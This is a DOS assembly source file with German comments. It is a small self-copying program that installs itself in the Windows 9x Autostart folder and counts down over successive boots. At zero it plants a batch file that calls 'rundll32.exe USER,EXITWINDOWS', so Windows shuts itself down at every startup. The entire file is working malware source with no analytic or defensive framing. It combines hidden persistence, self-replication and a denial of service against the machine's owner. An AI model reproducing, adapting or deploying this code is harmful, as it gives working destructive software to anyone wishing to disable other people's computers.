.model tiny
.code
cmp b [offset dat+43],"0"
je zero
dec b [offset dat+43]
;datei öffnen
mov ax,03c00
xor cx,cx
mov dx,offset dat
int 021
;datei schreiben
mov bx,ax	;handle
mov ax,04000
mov cx,259	;dateilänge!!!!!!!!!!!!!
mov dx,0100
int 021
;datei schliessen
mov ax,03e00
int 021

;bat
inc b [offset dat+43]
;bat öffnen
mov ax,03c00
xor cx,cx
mov dx,offset bat
int 021
;bat schreiben
mov bx,ax	;handle
mov ax,04000
mov cx,62
mov dx,offset txt
int 021
;bat schliessen
mov ax,03e00
int 021
jmp ende

zero:	;hier geht die Welt unter.
;bat öffnen
mov ax,03c00
xor cx,cx
mov dx,offset bat
int 021
;bat schreiben
mov bx,ax	;handle
mov ax,04000
mov cx,40
mov dx,offset zer
int 021
;bat schliessen
mov ax,03e00
int 021

ende:	;Programmende
mov ax,4c00h
int 21h

.data
txt:	db "echo off",0d,0a,"del "
dat:	db "C:\WINDOWS\STARTM~1\PROGRA~1\AUTOST~1\count9.com",0
bat:	db "C:\WINDOWS\STARTM~1\PROGRA~1\AUTOST~1\countx.bat",0
zer:	db "C:\WINDOWS\rundll32.exe USER,EXITWINDOWS"

end